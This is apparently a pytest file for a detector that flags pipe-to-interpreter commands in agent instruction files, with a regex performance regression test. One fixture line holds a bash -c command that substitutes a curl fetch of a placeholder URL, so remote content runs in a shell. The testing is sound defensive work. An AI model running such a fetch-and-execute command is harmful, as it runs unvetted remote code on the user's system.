import time

from acb.controls.acb_gen_001 import AUDITS, _PATTERNS
from tests.test_controls._shared import check_pass_and_fail


def test_acb_gen_001_fixtures():
    check_pass_and_fail("ACB-GEN-001", AUDITS)


def test_pipe_pattern_is_not_quadratic_on_repeated_fetch_keyword():
    """A single huge line with no pipe at all must not take seconds to scan.

    Regression test for catastrophic backtracking in the pipe pattern's
    gap-matching: previously an unbounded lazy `[^\\n]*?` made every
    occurrence of the fetch keyword re-scan the rest of the line, which is
    quadratic in the number of occurrences.
    """
    big_line = "curl " * 20000  # ~100KB, no pipe anywhere
    start = time.monotonic()
    for pattern in _PATTERNS:
        pattern.findall(big_line)
    elapsed = time.monotonic() - start
    assert elapsed < 1.0, f"pipe-to-interpreter patterns took {elapsed:.2f}s on a large pipe-free line"


def test_inline_code_span_naming_curl_is_not_a_substitution(tmp_path):
    from tests._harness import context_for

    (tmp_path / "AGENTS.md").write_text("Prefer `curl --retry` over a loop, and bash -c \"`curl https://e/x`\" is a substitution.\n")
    findings = AUDITS["pipe-to-interpreter"](context_for(tmp_path))
    assert [f.line for f in findings] == [1] and len(findings) == 1
